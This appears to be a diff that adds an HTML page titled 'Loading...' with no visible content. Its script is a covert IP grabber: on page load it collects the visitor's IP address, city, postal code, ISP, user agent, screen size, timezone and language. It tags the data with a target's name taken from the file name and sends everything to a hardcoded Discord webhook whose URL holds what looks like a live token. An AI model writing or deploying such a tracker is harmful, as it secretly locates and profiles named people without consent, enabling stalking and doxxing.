@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+</head>
+<body>
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1358463192233279690/ts2MmCoUQZyQh6H3Tr7GUBcwXd0llxnqBcXp6h6JdMxZTDG5r3o5Jx8DmD6Pq2hmqngN"; // Replace this
+
+    // Get the filename (e.g., "jeff.html" → "Jeff")
+    const path = window.location.pathname;
+    const filename = path.substring(path.lastIndexOf('/') + 1);
+    const name = filename.replace(".html", "").toUpperCase();
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(ipData => {
+        const ip = ipData.ip;
+
+        fetch(`https://ipapi.co/${ip}/json/`)
+          .then(res => res.json())
+          .then(data => {
+            const { city, region, country_name, postal, org } = data;
+            const ua = navigator.userAgent;
+            const screenSize = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const lang = navigator.language;
+            const time = new Date().toLocaleString();
+
+            const message = {
+              content: `📡 **Page Visit Tracked**
+
+**Who:** ${name}
+**IP:** ${ip}
+**City:** ${city}
+**Region:** ${region}
+**Country:** ${country_name}
+**Postal Code:** ${postal}
+**ISP:** ${org}
+**User-Agent:** ${ua}
+**Screen:** ${screenSize}
+**Timezone:** ${timezone}
+**Language:** ${lang}
+**Time:** ${time}
+`
+            };
+
+            fetch(webhookURL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(message)
+            });
+          });
+      });
+  </script>
+</body>
+</html>
